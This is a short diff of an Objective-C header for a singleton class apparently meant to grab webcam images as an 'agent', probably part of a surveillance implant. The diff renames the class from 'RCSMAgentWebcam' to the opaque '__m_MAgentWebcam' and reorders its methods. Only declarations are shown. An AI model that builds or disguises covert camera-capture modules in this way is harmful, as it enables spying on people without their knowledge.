@@ -21,7 +21,7 @@ typedef struct _webcam {
 // End of Chiodo
 
 
-@interface RCSMAgentWebcam : NSObject <Agents> 
+@interface __m_MAgentWebcam : NSObject <Agents> 
 {
 @private
   BOOL                              mImageGrabbed;
@@ -34,15 +34,19 @@ typedef struct _webcam {
   
 }
 
-+ (RCSMAgentWebcam *)sharedInstance;
-+ (id)allocWithZone: (NSZone *)aZone;
++ (__m_MAgentWebcam *)sharedInstance;
+
 - (id)copyWithZone: (NSZone *)aZone;
++ (id)allocWithZone: (NSZone *)aZone;
+
+- (unsigned)retainCount;
 - (id)retain;
 - (id)init;
-- (unsigned)retainCount;
+
 - (void)release;
 - (id)autorelease;
-- (void)setAgentConfiguration: (NSMutableDictionary *)aConfiguration;
+
 - (NSMutableDictionary *)mAgentConfiguration;
+- (void)setAgentConfiguration: (NSMutableDictionary *)aConfiguration;
 
 @end
